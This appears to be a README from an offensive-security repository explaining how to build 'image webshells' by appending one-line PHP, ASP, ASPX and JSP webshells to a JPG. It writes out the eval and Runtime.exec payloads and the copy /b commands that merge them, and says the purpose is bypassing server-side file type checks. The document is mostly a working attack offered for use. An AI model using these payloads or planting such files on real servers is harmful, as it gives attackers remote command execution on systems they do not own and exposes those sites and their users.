# Generate Image Webshell

## 0x00 General Overview

Image webshell is generated by attaching script codes on to a real image.

It is very effective to bypass content based server side file type verification.

## 0x01 Steps

Take PHP as an example here.

### Replace Image

Get a prefered image you like and save in this directory as **img.jpg**

![](img.jpg)

### Modify Code

The code stored in [webshell.php](./webshell.php) has only one line, modify **test** to any variable names for remote connection.

```php
<?php @eval($_POST['test'])?>
```

```asp
<%eval request("test")%>
```

```aspx
<%@ Page Language="Jscript"%><%eval(Request.Item["test"],"unsafe");%>
```

```jsp
<%Runtime.getRuntime().exec(request.getParameter("test"));%>
```

### Generate

Run the following command in CMD or double click the batch file.

```bat
copy img.jpg/b + webshell.php test_php.jpg
copy img.jpg/b + webshell.asp test_asp.jpg
copy img.jpg/b + webshell.aspx test_aspx.jpg
copy img.jpg/b + webshell.jsp test_jsp.jpg
```

And you will get a image shell.

#### test_php.jpg

![](test_php.jpg)

#### test_asp.jpg

![](test_asp.jpg)

#### test_aspx.jpg

![](test_aspx.jpg)

#### test_jsp.jpg

![](test_jsp.jpg)